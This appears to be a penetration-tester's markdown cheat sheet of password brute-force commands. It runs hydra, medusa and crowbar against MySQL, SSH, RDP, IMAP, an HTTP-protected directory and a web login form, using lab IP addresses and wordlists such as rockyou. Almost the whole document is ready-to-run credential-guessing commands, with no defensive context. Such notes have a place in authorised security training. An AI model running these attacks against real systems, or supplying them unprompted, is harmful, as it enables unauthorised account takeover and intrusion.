## Brute Force mysql:
--> Note: if you have too many connections, my sql will usually time you out!!!!

```
hydra -t 1 -L usernames.txt -P password.txt 192.168.151.11 mysql
```

## Brute Force ssh:

```
hydra -l root -p admin -s 22222 192.168.151.96 -t 4 ssh
```

## Brute force http protected dir

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## Brute Force RDP, VNC, SSH

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```

## Brute Force with user and password lists RDP:

```
sudo crowbar -b rdp -s 10.11.1.222/32 -U userlist.txt -C pass.txt
```

## SSH attack with Hydra

```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

## Http post attack

```
 hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

## IMAP Brute Force

```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
```